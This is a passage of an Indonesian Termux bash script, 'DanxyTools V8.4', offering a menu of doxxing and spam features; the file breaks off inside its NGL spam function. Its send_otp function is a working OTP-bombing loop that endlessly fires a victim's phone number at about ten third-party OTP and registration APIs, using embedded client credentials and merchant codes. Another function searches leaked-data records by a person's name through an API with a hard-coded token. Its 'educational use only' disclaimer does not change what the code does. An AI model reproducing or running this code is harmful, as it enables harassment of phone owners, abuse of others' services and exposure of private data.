#!/bin/bash

# Kode warna untuk teks
BLUE='\033[1;94m'
GREEN='\033[1;92m'
RED='\033[1;91m'
CYAN='\033[1;96m'
YELLOW='\033[1;93m'
MAGENTA='\033[1;95m'
WHITE='\033[1;97m'

# Kode warna untuk latar belakang
BG_BLUE='\033[1;44m'
BG_GREEN='\033[1;42m'
BG_RED='\033[1;41m'
BG_CYAN='\033[1;46m'
BG_YELLOW='\033[1;43m'
BG_MAGENTA='\033[1;45m'
BG_WHITE='\033[1;47m'

# Kode untuk mengatur gaya teks
BOLD='\033[1m'
UNDERLINE='\033[4m'
BLINK='\033[5m'

# Kode untuk menghapus warna dan gaya
NC='\033[0m'

WHATSAPP_CHANNEL_URL="https://whatsapp.com/channel/0029VaznZlq7z4kW00unHZ0e"
API_KEY="YOUR_API_KEY"
API_URL="https://api.fikmydomainsz.xyz/tools/nik?nik="

command_exists() {
  command -v "$1" >/dev/null 2>&1
}

SOUND_ENABLED=true

klik() {
    if [ "$SOUND_ENABLED" = true ]; then
        curl -sL https://github.com/112233-bot-bot/lolghost/raw/refs/heads/main/klik.mp3 | \
        play -q -t mp3 -
    fi
}
# Fitur untuk mematikan sound
OFF_KLIK() {
    SOUND_ENABLED=false
}

# Fitur untuk menghidupkan sound lagi
ON_KLIK() {
    SOUND_ENABLED=true
}


# letakkan di bagian global (atas) script supaya tersedia untuk semua fungsi
SOUND_SALAH_ENABLED=true

salah() {
  # hanya mainkan sound jika enabled
  if [ "${SOUND_SALAH_ENABLED}" = true ]; then
    curl -sL https://github.com/112233-bot-bot/lolghost/raw/refs/heads/main/pilihanSalah.mp3 | \
    play -q -t mp3 - 2>/dev/null
  fi
}

disableSalah() {
  SOUND_SALAH_ENABLED=false
}

enableSalah() {
  SOUND_SALAH_ENABLED=true
}

toggleSalah() {
  if [ "${SOUND_SALAH_ENABLED}" = true ]; then
    disableSalah
  else
    enableSalah
  fi
}




hello() {
    # auto-install sox jika belum ada
    if ! command -v play &>/dev/null; then
        echo -e "\033[1;33m[ + ] INSTALL SOX\033[0m"
        pkg install -y sox >/dev/null 2>&1
    fi
    echo -e "${RED}
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
│ ██████╗░░█████╗░███╗░░██╗██╗░░██╗██╗░░░██╗ │
│ ██╔══██╗██╔══██╗████╗░██║╚██╗██╔╝╚██╗░██╔╝ │
│ ██║░░██║███████║██╔██╗██║░╚███╔╝░░╚████╔╝░ │
│ ${WHITE}██║░░██║██╔══██║██║╚████║░██╔██╗░░░╚██╔╝░░ │
│ ██████╔╝██║░░██║██║░╚███║██╔╝╚██╗░░░██║░░░ │
│ ╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝░░░╚═╝░░░ │ [ ${RED}V8.4${NC} ]
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯" | lolcat -p 0.7
    local txt=" HALLO BRO SELAMAT DATANG DI DANXY TOOLS V8.4 "
    local delay=0.04
    local len=${#txt}

    # play sound (skip jika gagal)
    curl -sL --max-time 4 \
        https://github.com/112233-bot-bot/lolghost/raw/refs/heads/main/welcome.mp3 \
        2>/dev/null | play -q -t mp3 - &

    # type-writer effect
    for ((i=0; i<=len; i++)); do
        printf "\r\033[1;93;41m%${i}s\033[0m" "${txt:0:i}"
        sleep "$delay"
    done
    printf "\n"
}




banner() {
  if command_exists figlet; then
    clear
    toilet -f slant   "     Loading     " --filter border | lolcat -p 0.7
    echo -e "                    ${BG_RED}${YELLOW}SABAR CUY BENTAR DOANG KOK${NC}"
  else
  sleep 2
    clear
    echo -e "${CYAN}===== DanxyTools =====${NC}"
  fi
  #echo -e "${BLUE}"
  #echo "     ╭────────────────────────────────────╮" | lolcat -p 0.7
 # echo "     │    [] LOADING SABAR YHA CUY []   │" | lolcat -p 0.7
 # echo "     ╰────────────────────────────────────╯" | lolcat -p 0.7
  echo -e "${RED}" | lolcat -p 0.7
  sleep 1
  clear
#  loading
  clear
  if command_exists figlet; then
    toilet -f slant "  DanxyTools  " --filter border | lolcat -p 0.7
    echo -e "      ┃ TOOLS INI DI BUAT & DI KEMBANGKAN OLEH DANXY OFFICIAL ┃"
    echo -e "      ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ "
   
  else
    echo -e "${CYAN}=====DanxyTools =====${NC}"
 #   loading | lolcat -p 0.7
    sleep 1
  fi
}

show_menu() {
  echo -e "
╭───────────────────────────────────────────────────────────────────╮
│                       DANXY TOOLS VERSI FREE                      │
╭───────┬────────────────────────────────────────────────┬──────────╮
│ [ 1 ] │ LACAK NOMOR (eWallet)                          │   JAM    │
│ [ 2 ] │ LACAK NAMA (LeakOSINT)                         │ $(date +'%H:%M:%S') │
│ [ 3 ] │ SUNTIK TIKTOK                                  │          │
│ [ 4 ] │ CEK PROVIDER NOMOR                             │          │
│ [ 5 ] │ SCAN WEBSITE                                   │          │
│ [ 6 ] │ CEK KEBOCORAN EMAIL                            │          │
│ [ 7 ] │ INFO TOOLS                                     │          │
│ [ 8 ] │ KIRIM OTP (WA/SMS)                             │          │
│ [ 9 ] │ CEK IP ADDRESS                                 │          │
│ [ 10] │ SPAM NGL UNLIMITED                             │          │
│ [ 11] │ ASCII ART GENERATOR                            │          │
│ [ 12] │ CEK NIK & KK                                   │          │
│ [ 0 ] │ KELUAR                                         │          │
╰───────┴────────────────────────────────────────────────┴──────────╯
│                                                                   │
╰───────────────────────────────────────────────────────────────────╯
" | lolcat -p 0.7
  echo -e " ${GREEN}● ${YELLOW}● ${RED}●"
  echo -e " ${WHITE}DEVELOPER: ${BG_GREEN}${RED}DANXY OFFICIAL✓${NC}"
}


main_menu() {
  clear
  hello
  while true; do
    banner
    show_menu
    printf "${GREEN} ┏━[ ${RED}DANXY TOOLS V.FREE${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}MENU UTAMA${YELLOW}${RED}]${NC}${GREEN}\n ┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} " 
    read -r danxy

    case $danxy in
    1)
      klik
      osint_name_pake_nomor
      kembali_ke_menu
      klik 
      ;;
    2)
      klik
      osin_name
      kembali_ke_menu
      klik
      ;;
    3)
      klik
      suntik_tiktok
      kembali_ke_menu
      klik
      ;;
    4)
      klik
      cek_provider
      kembali_ke_menu
      klik
      ;;
    5)
      klik
      scan_website
      kembali_ke_menu
      klik
      ;;
    6)
      klik
      cek_kebocoran_email
      kembali_ke_menu
      klik
      ;;
    7)
      klik
      info
      kembali_ke_menu
      klik
      ;;
    8)
      klik
      send_otp
      break
      ;;
    9)
      klik
      cek_ip_address
      kembali_ke_menu
      klik
      ;;
    10)
      klik
      ngl_spam
      kembali_ke_menu
      klik
      ;;
    11)
      klik
      ascii_art_generator
      kembali_ke_menu
      klik
      ;;
    12)
      klik
      cek_nik_kk
      kembali_ke_menu
      klik
      ;;
    0)
      klik
      echo -e "${CYAN}TERIMAKASIH SUDAH MENGGUNAKAN TOOLS DANXY.${NC}"
      klik
      exit 0
      ;;
    *)
      echo -e "${RED}INPUT TIDAK VALID! MASUKKAN INPUT YANG BENAR!${NC}"
      salah
      sleep 3
      ;;
    esac
  done
}



validate_phone_number() {
  [[ "$1" =~ ^08[0-9]{8,11}$ ]] || {
    echo -e "${RED}Nomor telepon tidak valid. Harus dimulai dengan 08 dan memiliki 10-13 digit.${NC}"
    return 1
  }
  return 0
}

osint_name_pake_nomor() {
clear
echo -e "${RED} MAAF FITUR INI KUSUS PREMIUM${NC}"

  echo -e "${YELLOW}
  ╭────────────────────────────────────────╮
  │          ${CYAN}DANXY OFFICIAL 80${YELLOW}             │
  ╰────────────────────────────────────────╯${NC}"
}

osin_name() {
  read -p "Masukkan Nama: " nama
  nama=$(echo "$nama" | sed 's/[^a-zA-Z0-9 ]//g')

  echo -e "${YELLOW}Mencari informasi untuk nama: ${nama}...${NC}"

  response=$(
    curl -s -X POST "https://leakosintapi.com/" \
      -H "Content-Type: application/json" \
      -d "{\"token\": \"7953060066:oIsnLOha\", \"request\": \"$nama\", \"limit\": 1000, \"lang\": \"id\"}"
  )

  if [ $? -ne 0 ]; then
    echo -e "${RED}[ERROR] Gagal menghubungi API. Periksa koneksi internet Anda.${NC}"
    return 1
  fi

  folder="$HOME/OSINT_Logs"
  mkdir -p "$folder"
  output="$folder/${nama}.txt"

  if command_exists jq; then
    echo "$response" | jq . | tee "$output"
  else
    echo "Tool 'jq' tidak ditemukan. Output mentah disimpan ke $output"
    echo "$response" | tee "$output"
  fi

  echo -e "${GREEN}Data berhasil disimpan ke: $output${NC}"
}

suntik_tiktok() {
clear
  echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │           ${YELLOW}DANXY OFFICIAL 80${CYAN}            │
  ╰────────────────────────────────────────╯${NC}"
  echo -e "${YELLOW}Loading...${NC}"
echo -e "${RED} MAAF FITUR INI KUSUS PREMIUM${NC}"
}

cek_provider() {
  read -p "Masukkan Nomor Telepon (08xxxxxxxxxx): " nomor

  validate_phone_number "$nomor" || return 1

  prefix=$(echo "$nomor" | cut -c1-4)
  provider="Tidak dikenal"

  case "$prefix" in
  0811 | 0812 | 0813 | 0821 | 0822 | 0852 | 0853)
    provider="Telkomsel"
    ;;
  0851)
    provider="By.U (Telkomsel)"
    ;;
  0814 | 0815 | 0816 | 0855 | 0856 | 0857 | 0858)
    provider="Indosat"
    ;;
  0817 | 0818 | 0819 | 0859 | 0877 | 0878)
    provider="XL"
    ;;
  0895 | 0896 | 0897 | 0898 | 0899)
    provider="Tri (3)"
    ;;
  0881 | 0882 | 0883 | 0884 | 0885 | 0886 | 0887 | 0888)
    provider="Smartfren"
    ;;
  esac

  echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │           ${YELLOW}HASIL CEK PROVIDER${CYAN}           │
  ╰────────────────────────────────────────╯${NC}"

  echo -e "${GREEN}Nomor: ${nomor}${NC}"
  echo -e "${GREEN}Provider: ${provider}${NC}"

  echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │           ${YELLOW}DANXY OFFICIAL 80${CYAN}            │
  ╰────────────────────────────────────────╯${NC}"
}

scan_website() {
  read -p "Masukkan nama domain (contoh: DanxySmart.com): " domain

  echo -e "${YELLOW}
  ╭────────────────────────────────────────╮
  │         ${CYAN}MEMULAI SCAN WEBSITE${YELLOW}           │
  ╰────────────────────────────────────────╯${NC}"

  response=$(curl -s "https://api.hackertarget.com/hostsearch/?q=$domain")

  if [ $? -ne 0 ]; then
    echo -e "${RED}[ERROR] Gagal menghubungi API. Periksa koneksi internet Anda.${NC}"
    return 1
  fi

  if [[ -n "$response" ]]; then
    echo -e "${GREEN}Hasil pemindaian:${NC}"
    echo "$response"
  else
    echo -e "${RED}Gagal mendapatkan hasil dari HackerTarget API.${NC}"
  fi

  echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │           ${YELLOW}DANXY OFFICIAL 80${CYAN}            │
  ╰────────────────────────────────────────╯${NC}"
}

cek_kebocoran_email() {
clear
echo -e "${RED} MAAF FITUR INI KUSUS PREMIUM${NC}"

  echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │           ${YELLOW}DANXY OFFICIAL 80${CYAN}            │
  ╰────────────────────────────────────────╯${NC}"
}

info() {
  clear
echo -e "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣄⣤⣤⣦⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠠⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⡗⠉⢹⣯⣿⡽⣷⣟⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠔⠊⠁⠀⠀⠀⠑⠢⢄⠀⠀⠀⠀⠀⡖⡔⣆⢖⢔⢆⢖⢔⢆⢖⢔⢆⢖⢔⢆⢖⢔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⠿⠾⠽⠷⣻⣽⢿⡾⣷⡇⠀⠀⠀⠀⠀⠀⡠⠔⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠤⡀⠀⡳⡹⡸⡜⣕⢝⡜⣕⢇⢇⢇⢇⢇⢇⢇⢏⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣔⣶⣶⣾⢶⣶⣶⣶⡷⣾⣽⣟⣿⣽⡇⢐⢐⠐⠠⠀⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣮⠂⡪⣣⢳⠁⢀⠁⠈⠀⠁⠀⠁⠀⠁⠈⡎⡎⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⡾⣟⣯⣷⢿⣻⣽⡷⣟⣿⣽⡾⣯⣷⣟⡇⢀⠢⠨⢈⢂⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢴⡽⣞⣷⣻⠄⢸⢜⢎⡂⠀⢢⡣⣣⢣⡒⡲⡰⡒⡜⡜⣜⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⡿⣯⣿⣻⡿⠝⠛⠛⠝⠚⠛⠫⠓⠋⡀⡂⠌⠌⡐⠄⡇⠀⠀⠀⠀⠀⠀⠀⠀⣠⣲⢯⢿⡽⣽⣻⣞⣾⠁⢸⢸⡱⠅⡀⢈⠨⠈⠈⠈⠈⠈⠈⢘⢜⢜⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣟⣿⢾⡻⠀⠄⠅⠅⡊⠌⠌⠌⡐⡁⡂⠔⠡⠨⠠⢑⡇⠀⠀⠀⠀⠀⠀⠀⠀⡷⡯⠏⡫⣟⣷⣳⣟⣾⠁⠨⡪⡎⡧⡰⡠⡢⡤⠥⠤⢤⠀⠀⢸⢸⢱⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠺⣯⢿⣻⡇⠈⢌⢐⢁⠂⠅⡊⡐⡐⡐⠠⠡⠡⠡⢁⠂⡇⠀⠀⠀⠀⠀⠀⠀⠀⡿⣭⢘⠹⣻⣞⣗⡷⣯⠃⠀⡏⡮⣒⠀⢀⠳⢭⠭⡹⡨⠀⠀⢕⢕⡳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠙⠉⠃⢈⠐⠄⡂⠅⡁⡀⠠⢀⢀⠁⠁⠁⠈⠀⠀⠘⠤⡀⠀⠀⠀⠀⠀⠀⡿⣝⠙⣼⣝⡮⣞⡯⠏⠀⠀⡣⡳⡱⣀⠠⠀⡀⠁⠀⠀⢀⢀⢇⢇⢗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠠⢁⠅⡂⠅⡂⠌⠌⠀⠂⠅⠀⠀⠀⠀⠀⠀⠀⠈⠑⠢⣀⠀⠀⠀⡿⣽⣻⣺⠳⠋⠁⠀⠀⠀⠀⢕⢝⢎⢮⢝⢕⢖⢕⢜⢜⢜⢜⢜⡜⡕⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠁⢂⠂⠅⡂⠅⡂⡂⠌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠄⡯⠗⠋⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠋⠪⠪⢣⢳⡱⡕⡕⠇⠏⠊⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⢠⣦⣴⣤⣄⠀⢤⣦⣴⣄⠀⢴⣴⣤⢰⣴⡤⣰⣴⣤⣦⣦⡦⣴⣤⣦⣴⣤⠀⢠⣦⣴⣤⣦⢀⣠⣦⣦⣄⠀⢀⣤⣦⣦⣀⢠⣦⣦⡄⠀⣠⣦⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⢈⣿⡧⢹⣿⡇⢰⣟⣿⣿⠀⢨⣿⣿⣧⣿⠅⠀⢻⣿⣾⡋⠀⠙⣿⣷⠟⠀⠀⠘⠫⣿⣏⠛⢸⣿⡇⢸⣿⣇⣿⣿⠀⣿⣿⠀⣿⣿⢀⡀⢿⣷⣿⣅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⢰⣿⣷⣾⠿⠣⣾⣯⢽⣿⣧⢴⣿⡜⣿⣿⠅⣶⣿⡭⣿⣷⡆⠀⣾⣿⣇⠀⠀⠀⣸⣿⣷⡀⠘⢿⣧⣾⠿⠃⠻⣿⣦⡿⠟⢰⣿⣿⣾⣇⣷⣯⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
     " | lolcat -p 0.7
  loading
  clear
  echo -e "${RED}
  ╭────────────────────────────────────────╮
  │              ${BLUE}INFO TOOLS${RED}                │
  ╰────────────────────────────────────────╯
  ${NC}"

  echo -e "${GREEN}
Tools ini dikembangkan oleh DanxyOfficial
untuk tujuan edukasi dan eksplorasi teknologi.

[ ∅ ] ${BOLD}${RED}Tujuan Utama:${GREEN}
 - Mendorong pembelajaran seputar keamanan digital
 - Membantu pengguna memahami potensi celah sistem secara etis
 - Melatih keterampilan pencarian data terbuka (OSINT)
 - Menyediakan media belajar scripting & automasi di Termux

[ ∅ ] ${BOLD}${RED}Penggunaan Bertanggung Jawab:${GREEN}
   Tools ini hanya diperuntukkan untuk:
 - Edukasi & eksplorasi pribadi
 - Pengujian sistem milik sendiri (authorized testing)
 - Eksperimen dalam ruang lingkup legal

[ ∅ ] ${BOLD}${RED}Dilarang keras:${GREEN}
 - Menggunakan tools untuk tindak ilegal
   (peretasan, penipuan, penyalahgunaan data)
 - Melanggar privasi pihak lain tanpa izin
 - Menjual atau menyebarluaskan ulang tanpa izin dari pembuat
 - Menghapus atau mengubah nama pembuat (credit)

[ ∅ ] ${BOLD}${RED}Peringatan:${GREEN}
 Penyalahgunaan tools ini 
 dapat menimbulkan konsekuensi hukum.
 Jadilah pengguna yang bijak dan bertanggung jawab.

[ ∅ ] ${BOLD}${RED}Kontak & Support Resmi:${GREEN}
  - YouTube : ${YELLOW}https://www.youtube.com/@DanxyOfficial${GREEN}
  - Telegram: ${YELLOW}t.me/DanxyStore${GREEN}
  - TikTok  : ${YELLOW}Qwela.38${GREEN}

  ${YELLOW}${BOLD}Terima kasih telah menggunakan tools ini secara positif.
  Semoga memberikan manfaat dan wawasan baru untukmu.${GREEN}
  ${NC}"

  echo -e "${RED}
  ╭────────────────────────────────────────╮
  │          ${BLUE}DANXY OFFICIAL 80${RED}             │
  ╰────────────────────────────────────────╯
  ${NC}"
}

send_otp() {
  read -p "Masukkan Nomor Telepon (08xxxxxxxxxx): " phone_number

  [[ "$phone_number" == "exit" ]] && return

  validate_phone_number "$phone_number" || {
    echo -e "${RED}Nomor telepon tidak valid.${NC}"
    return
  }

  echo -e "${RED}
    PERINGATAN: Fungsi ini akan mengirim
    OTP secara terus menerus ke nomor
    yang Anda masukkan.
    Gunakan dengan bijak!!
  ${NC}"

  send_otp_to_number() {
    local nomor="$1"
    local LOG_FILE="otp_errors.log"

    local url="https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id="
    local payload="{\"mobile_phone\": \"$nomor\", \"type\": \"mobile\", \"is_switchable\": 1}"
    local headers=("Content-Type: application/json; charset=utf-8")

    (curl -s -X POST -d "$payload" -H "${headers[0]}" "$url" >/dev/null 2>>"$LOG_FILE") &
    echo -e "${YELLOW}Mengirim OTP ke $nomor melalui Singa...${NC}"

    echo -e "${YELLOW}Mencoba mengirim OTP melalui Titipku...${NC}"
    (
      curl -s -X POST "https://titipku.tech/v1/mobile/auth/otp?method=wa" \
        -H "Content-Type: application/json; charset=UTF-8" \
        -d "{\"phone_number\": \"+62$nomor\", \"message_placeholder\": \"hehe\"}" >/dev/null 2>>"$LOG_FILE"
    ) &

    (
      curl -s -X POST "https://api-mobile.bisatopup.co.id/register/send-verification" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "phone_number=$nomor" >/dev/null 2>>"$LOG_FILE"
    ) &

    jogja_token=$(
      curl -s -X POST "https://aci-user.bmsecure.id/oauth/token" \
        -H "Authorization: Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "User-Agent: okhttp/4.10.0" \
        -d "grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1"
    )

    jogja_token_value=$(echo "$jogja_token" | grep -o '"access_token":"[^"]*"' | cut -d':' -f2 | tr -d '"')

    (
      curl -s -X POST "https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send" \
        -H "Authorization: Bearer $jogja_token_value" \
        -H "Content-Type: application/json; charset=UTF-8" \
        -d "{\"phone_user\": \"$nomor\"}" >/dev/null 2>>"$LOG_FILE"
    ) &
    (
      curl -s -X POST "https://app.candireload.com/apps/v8/users/req_otp_register_wa" \
        -H "Content-Type: application/json" \
        -H "irsauth: c6738e934fd7ed1db55322e423d81a66" \
        -d "{\"uuid\": \"b787045b140c631f\", \"phone\": \"$nomor\"}" >/dev/null 2>>"$LOG_FILE"
    ) &
    speedcash_token=$(
      curl -s -X POST "https://sofia.bmsecure.id/central-api/oauth/token" \
        -H "Authorization: Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "grant_type=client_credentials"
    )

    speedcash_token_value=$(echo "$speedcash_token" | grep -o '"access_token":"[^"]*"' | cut -d':' -f2 | tr -d '"')

    (
      curl -s -X POST "https://sofia.bmsecure.id/central-api/sc-api/otp/generate" \
        -H "Authorization: Bearer $speedcash_token_value" \
        -H "Content-Type: application/json" \
        -d "{\"version_name\": \"6.2.1 (428)\", \"phone\": \"$nomor\"}" >/dev/null 2>>"$LOG_FILE"
    ) &
    (
      curl -s -X POST "https://keranjangbelanja.co.id/api/v1/user/otp" \
        -H "content-type: multipart/form-data; boundary=--dio-boundary-0879576676" \
        --data-binary $'----dio-boundary-0879576676\r\ncontent-disposition: form-data; name="phone"\r\n\r\n'"$nomor"$'\r\n----dio-boundary-0879576676\r\ncontent-disposition: form-data; name="otp"\r\n\r\n118872\r\n----dio-boundary-0879576676--' >/dev/null 2>>"$LOG_FILE"
    ) &
    (curl -s "https://irsx.mitradeltapulsa.com:8080/appirsx/appapi.dll/otpreg?phone=$nomor" >/dev/null 2>>"$LOG_FILE") &
    (
      curl -s -X POST "https://agenpayment-app.findig.id/api/v1/user/register" \
        -H "content-type: application/json; charset=utf-8" \
        -H "merchantcode: 63d22a4041d6a5bc8bfdb3be" \
        -d "{\"name\": \"AAD\", \"phone\": \"$nomor\", \"pin\": \"1111\", \"referral_code\": \"\", \"password\": \"12345678\"}" >/dev/null 2>>"$LOG_FILE"
    ) &
    (
      curl -s -X POST "https://agenpayment-app.findig.id/api/v1/user/login" \
        -H "content-type: application/json; charset=utf-8" \
        -H "merchantcode: 63d22a4041d6a5bc8bfdb3be" \
        -d "{\"phone\": \"$nomor\", \"pin\": \"1111\"}" >/dev/null 2>>"$LOG_FILE"
    ) &
    echo -e "${CYAN}OTP telah dikirim ke berbagai API (secara paralel).${NC}"
  }
  send_otp_to_number "$phone_number"
  while true; do
    send_otp_to_number "$phone_number"
  done
}

cek_ip_address() {
  echo -e "${YELLOW}
  ╭────────────────────────────────────────╮
  │        ${CYAN}MENDAPATKAN IP ADDRESS${YELLOW}          │
  ╰────────────────────────────────────────╯${NC}"
  public_ip=$(curl -s https://api.ipify.org)
  location_info=$(curl -s "http://ip-api.com/json/$public_ip")

  if [[ -n "$public_ip" && -n "$location_info" ]]; then
    echo -e "${GREEN}IP Address Publik Anda: ${CYAN}$public_ip${NC}"
    echo -e "${GREEN}Informasi Lokasi:${NC}"
    echo "$location_info" | jq .
  else
    echo -e "${RED}Gagal mendapatkan IP address atau informasi lokasi.${NC}"
  fi
  echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │           ${YELLOW}DANXY OFFICIAL 80${CYAN}            │
  ╰────────────────────────────────────────╯${NC}"
}

ascii_art_generator() {
  read -p "Masukkan teks yang ingin diubah menjadi ASCII art: " text

  echo -e "${YELLOW}
  ╭────────────────────────────────────────╮
  │      ${CYAN}MEMBUAT ASCII ART${YELLOW}           │
  ╰────────────────────────────────────────╯${NC}"
  fonts=("standard" "slant" "shadow" "banner" "block" "smblock" "big" "smisome1" "isometric1" "letters" "contessa" "larry3d" "nancyj-fancy" "starwars")
  echo -e "${GREEN}Pilih font:${NC}"
  for i in "${!fonts[@]}"; do
    echo -e "${CYAN}[ $((i + 1)) ] ${fonts[$i]}${NC}"
  done
  read -p "Masukkan nomor font yang diinginkan: " font_number
  [[ "$font_number" =~ ^[0-9]+$ ]] || {
    echo -e "${RED}Nomor font harus berupa angka.${NC}"
    return 1
  }
  [[ "$font_number" -lt 1 || "$font_number" -gt ${#fonts[@]} ]] && {
    echo -e "${RED}Nomor font tidak valid.${NC}"
    return 1
  }
  selected_font="${fonts[$((font_number - 1))]}"
  if command_exists figlet; then
    figlet -f "$selected_font" "$text" | lolcat
  else
    echo -e "${RED}figlet tidak ditemukan. Instal figlet untuk menggunakan fitur ini.${NC}"
  fi

  echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │           ${YELLOW}DANXY OFFICIAL 80${CYAN}            │
  ╰────────────────────────────────────────╯${NC}"
}

ngl_spam() {
  clear
  spasi
  echo -e "${RED}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
